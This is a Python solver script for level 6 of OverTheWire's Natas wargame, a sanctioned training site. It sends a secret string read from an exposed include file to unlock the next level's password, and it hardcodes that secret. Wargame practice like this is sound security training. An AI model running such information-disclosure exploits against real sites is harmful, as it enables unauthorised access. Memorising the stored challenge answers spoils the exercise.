import requests

import natas5
from helpers import between


def solution() -> str:
    url = "http://natas6.natas.labs.overthewire.org"
    username = "natas6"
    password = natas5.solution()

    # There is a "view source" link that shows that the app includes
    # http://natas6.natas.labs.overthewire.org/includes/secret.inc
    # Viewing the secret.inc source reveals the secret.

    data = {"secret": "FOEIUWGHFEEUHOFUOIU", "submit": "Submit+Query"}
    r = requests.post(url, auth=(username, password), data=data)
    start = "The password for natas7 is "
    end = "\n<form method=post>"
    natas6_password = between(r.text, start, end)
    return natas6_password
